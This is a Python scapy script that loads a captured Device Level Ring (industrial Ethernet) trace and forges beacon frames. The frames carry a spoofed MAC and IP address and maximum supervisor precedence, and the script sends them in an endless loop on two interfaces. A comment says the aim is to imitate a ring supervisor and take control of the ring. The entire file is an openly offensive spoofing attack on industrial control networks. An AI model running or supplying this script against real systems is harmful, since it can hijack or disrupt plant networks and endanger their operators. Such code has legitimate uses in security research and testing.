__author__ = 'bernardyuan'

from scapy import all
from scapy.layers import  l2
import DLR
# read the pcap file
a = all.rdpcap('DLR/dlr.pcap')
import time
#in order: Beacon, nbr request, link status, locate fault,Announce, Sign on
# fake a packet and send through wireshark

#fabricate packet method 1:
#construct from keywords
# b = l2.Ether(**a[i][l2.Ether].fields)/l2.Dot1Q(**a[i][l2.Dot1Q].fields)/protocol.DLR(**a[i][protocol.DLR].fields)
# remember when constructed from keywords, do change the explicit value of ALL layers into 1
# otherwise use method 2, given below:
# b.explicit = 1
# b.payload.explicit = 1

# method 2:
# construct from raw string
# b0 = l2.Ether(str(a[0]))

# In the following code, we construct a new packet with method2, which could make your machine imitate
# a ring supervisor, and take control of the ring
# newpacket = l2.Ether(**a[30467][l2.Ether].fields)/l2.Dot1Q(**a[30467][l2.Dot1Q].fields)/DLR.DLR(**a[30467][DLR.DLR].fields)
newpacket = l2.Ether(**a[0][l2.Ether].fields)/l2.Dot1Q(**a[0][l2.Dot1Q].fields)/DLR.DLR(**a[0][DLR.DLR].fields)
# newpacket.payload.payload.fields["Node_Num"] = 1
# print newpacket.payload.payload.fields["SignOnInfo"]
# newpacket.payload.payload.fields["SignOnInfo"]["MACAddress"] = ["00:1d:9c:c8:03:e8"]
# newpacket.payload.payload.fields["SignOnInfo"]["IPAddress"] = ["192.168.0.19"]
newpacket.explicit = 1
newpacket.payload.explicit = 1
newpacket.fields["src"] = "00:1d:9c:c8:03:e8"
# newpacket.fields["dst"] = ""
# newpacket.payload.payload.fields["Source_Port"] = 1
newpacket.payload.payload.fields["Supervisor_Precedence"] = 255
newpacket.payload.payload.fields["Reserved"]='\x00\x01\x02\x03\x04\x05\x06\x07\x00\x01\x02\x03\x04\x05\x06\x07\x00\x01\x02\x03'
newpacket.payload.payload.fields["Sequence_ID"] = 0
newpacket.payload.payload.fields["Source_IP"] = '192.168.0.19'

# interval = newpacket.payload.payload.fields["Beacon_Interval"]
start = time.clock()
# print str(newpacket)
# print all.hexdump(newpacket)
all.sendp(str(newpacket),iface='en5')
all.sendp(str(newpacket),iface='en4')

while True:
    if time.clock() - start > 400*1.0/1000000:
        start = time.clock()
    # print str(newpacket)
        newpacket.payload.payload.fields["Sequence_ID"] = newpacket.payload.payload.fields["Sequence_ID"]+1
        newpacket.show()
        all.sendp(str(newpacket),iface='en5')
        all.sendp(str(newpacket),iface='en4')


